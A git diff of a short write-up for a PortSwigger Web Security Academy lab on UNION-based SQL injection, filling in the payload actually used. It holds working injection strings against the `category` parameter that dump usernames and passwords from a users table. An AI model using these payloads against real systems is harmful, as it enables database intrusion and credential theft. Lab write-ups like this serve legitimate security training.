@@ -1,4 +1,4 @@
-**Date / Analyst:** 2025-09-03 — Christopher Araque  
+**Date / Analyst:** 2025-09-03 — Chris Araque  
 **Environment:** PortSwigger WSA — UNION-based SQL injection
 
 ## TL;DR
@@ -12,14 +12,8 @@
 - Endpoint/Param: `/filter?category=`
 - Quote/comment used: `'` with `--+`
 - Column count (N): **2**
-- Visible text column(s): <1 or 2> <!-- pick the index that showed 'X' -->
-- Final payload used (choose the one you actually used):
-  - If both columns rendered text:  
-    `' UNION SELECT username,password FROM users--+`
-  - If only column 1 rendered text:  
-    `' UNION SELECT CONCAT(username,':',password),NULL FROM users--+`
-  - If only column 2 rendered text:  
-    `' UNION SELECT NULL,CONCAT(username,':',password) FROM users--+`
+- Visible text column(s): Both columns (1 and 2) displayed text successfully
+- Final payload used: `' UNION SELECT username,password FROM users--+`
 
 ## Steps (summary)
 
